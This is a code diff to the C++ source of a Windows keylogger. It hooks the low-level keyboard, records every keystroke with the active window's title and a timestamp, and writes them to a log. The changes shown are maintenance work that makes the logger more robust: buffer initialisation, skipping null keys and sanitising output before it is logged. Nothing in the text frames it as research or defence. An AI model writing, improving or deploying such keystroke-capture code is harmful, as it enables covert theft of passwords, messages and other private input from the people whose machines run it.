@@ -6,13 +6,14 @@
 #include <time.h>
 #include <fstream>
 #include <sstream>
+#include <algorithm>
 
 HHOOK _hook;
 KBDLLHOOKSTRUCT kbdStruct;
 
 int Save(int key_stroke)
 {
-    std::stringstream output;
+    std::stringstream ss;
     static char lastwindow[256] = "";
 
     if ((key_stroke == 1) || (key_stroke == 2))
@@ -31,7 +32,7 @@ int Save(int key_stroke)
 
     if (foreground)
     {
-        char window_title[256];
+        char window_title[256] = { 0 };
         GetWindowTextA(foreground, (LPSTR)window_title, 256);
 
         if (strcmp(window_title, lastwindow) != 0)
@@ -42,41 +43,41 @@ int Save(int key_stroke)
             time_t t = time(NULL);
             struct tm tm;
             localtime_s(&tm, &t);
-            char s[64];
+            char s[64] = { 0 };
             strftime(s, sizeof(s), "%Y-%m-%d %H:%M:%S", &tm);
 
-            output << "\n\n[" << s << ": " << window_title << "]\n";
+            ss << "\n\n[" << s << ": " << window_title << "]\n";
         }
     }
 
     switch (key_stroke)
     {
-        case VK_BACK:       output << "[BACKSPACE]";    break;
-        case VK_RETURN:     output << "[ENTER]";        break;
-        case VK_SPACE:      output << " ";              break;
-        case VK_TAB:        output << "[TAB]";          break;
-        case VK_MENU:       output << "[ALT]";          break;
-        case VK_ESCAPE:     output << "[ESC]";          break;
-        case VK_END:        output << "[END]";          break;
-        case VK_HOME:       output << "[HOME]";         break;
-        case VK_LEFT:       output << "[LEFT]";         break;
-        case VK_UP:         output << "[UP]";           break;
-        case VK_RIGHT:      output << "[RIGHT]";        break;
-        case VK_DOWN:       output << "[DOWN]";         break;
-        case VK_PRIOR:      output << "[PGUP]";         break;
-        case VK_NEXT:       output << "[PGDN]";         break;
+        case VK_BACK:       ss << "[BACKSPACE]";    break;
+        case VK_RETURN:     ss << "[ENTER]";        break;
+        case VK_SPACE:      ss << " ";              break;
+        case VK_TAB:        ss << "[TAB]";          break;
+        case VK_MENU:       ss << "[ALT]";          break;
+        case VK_ESCAPE:     ss << "[ESC]";          break;
+        case VK_END:        ss << "[END]";          break;
+        case VK_HOME:       ss << "[HOME]";         break;
+        case VK_LEFT:       ss << "[LEFT]";         break;
+        case VK_UP:         ss << "[UP]";           break;
+        case VK_RIGHT:      ss << "[RIGHT]";        break;
+        case VK_DOWN:       ss << "[DOWN]";         break;
+        case VK_PRIOR:      ss << "[PGUP]";         break;
+        case VK_NEXT:       ss << "[PGDN]";         break;
         case VK_LWIN:
-        case VK_RWIN:       output << "[WIN]";          break;
+        case VK_RWIN:       ss << "[WIN]";          break;
         case VK_SHIFT:
         case VK_LSHIFT:
-        case VK_RSHIFT:     output << "[SHIFT]";        break;
+        case VK_RSHIFT:     ss << "[SHIFT]";        break;
         case VK_CONTROL:
         case VK_LCONTROL:
-        case VK_RCONTROL:   output << "[CONTROL]";      break;
+        case VK_RCONTROL:   ss << "[CONTROL]";      break;
         case VK_OEM_PERIOD:
-        case VK_DECIMAL:    output << ".";              break;
-        case VK_OEM_MINUS:  output << "-";              break;
-        case VK_CAPITAL:    output << "[CAPSLOCK]";     break;
+        case VK_DECIMAL:    ss << ".";              break;
+        case VK_OEM_MINUS:  ss << "-";              break;
+        case VK_CAPITAL:    ss << "[CAPSLOCK]";     break;
         default:
             // check caps lock
             bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);
@@ -123,10 +124,14 @@ int Save(int key_stroke)
                 key = tolower(key);
             }
 
-            output << char(key);
+            if (key != 0)
+                ss << char(key);
     }
 
-    WriteLog(output.str());
+    // Ensure we do not write null terminator
+    std::string output = ss.str();
+    std::replace(output.begin(), output.end(), '\0', '¿');
+    WriteLog(output);
     
     return 0;
 }
